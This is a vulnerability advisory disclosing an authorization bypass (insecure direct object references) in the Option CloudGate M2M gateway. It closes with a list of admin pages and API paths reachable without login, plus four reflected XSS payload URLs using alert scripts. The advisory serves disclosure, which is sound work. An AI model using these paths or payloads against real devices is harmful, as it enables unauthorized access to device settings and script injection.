@@ -1,0 +1,59 @@
+﻿
+Option CloudGate Insecure Direct Object References Authorization Bypass
+
+
+Vendor: Option NV
+Product web page: http://www.option.com
+Affected version: CG0192-11897
+
+Summary: The CloudGate M2M gateway from Option provides competitively
+priced LAN to WWAN routing and GPS functionality in a single basic unit
+certified on all major us cellular operators (CDMA/EV-DO and WCDMA/HSPA+).
+The CloudGate is simple to configure locally or remotely from your PC,
+tablet or Smartphone.
+
+Desc: Insecure Direct Object References occur when an application provides
+direct access to objects based on user-supplied input. As a result of this
+vulnerability attackers can bypass authorization and access resources and
+functionalities in the system directly, for example APIs, files, upload
+utilities, device settings, etc.
+
+Tested on: lighttpd 1.4.39
+           firmware 2.62.4
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5333
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5333.php
+
+
+11.06.2016
+
+--
+
+
+GET /partials/firewall.html
+GET /partials/system.html
+GET /partials/ipsec.html
+GET /partials/provisioning.html
+GET /api/login
+GET /api/replacementui
+GET /api/goatgates
+
+OR
+
+/#/firewall
+/#/system
+/#/ipsec
+/#/provisioning
+
+
+XSS:
+
+http://127.0.0.2/api/replacementui<script>alert(1)</script>
+http://127.0.0.2/api/goatgates<script>alert(2)</script>
+http://127.0.0.2/api/Blah-Blah<script>alert(3)</script>
+http://127.0.0.2/api/<script>alert(4)</script>
